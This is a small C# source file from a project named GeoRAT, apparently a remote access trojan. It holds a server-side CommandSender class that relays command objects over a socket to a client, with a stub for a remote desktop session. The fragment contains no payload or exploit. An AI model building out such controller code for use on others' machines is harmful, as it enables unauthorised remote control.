
using System.Net.Sockets;
using GeoRAT.Core.Commands;
using GeoRAT.Server.Net;


namespace GeoRAT.Server.CommandHandlers
{
    //This class sends commands to client using DataHandler. 
    class CommandSender
    {

        //Delegates for remote desktop which i haven't implemented yet 

    
        public CommandSender(Socket s, Commands param1)
        {

            DataHandler sender = new DataHandler(s);
            switch (param1.CommandType)
            {
              
                case "Desktop": //If we want to start remote desktop session
                    sender.Send(param1);
                    break; 
                default: //Just send command for now 
                    sender.Send(param1);
                    break;
            }

        }

       
        public CommandSender()
        {

        }


        
     
        }
    }
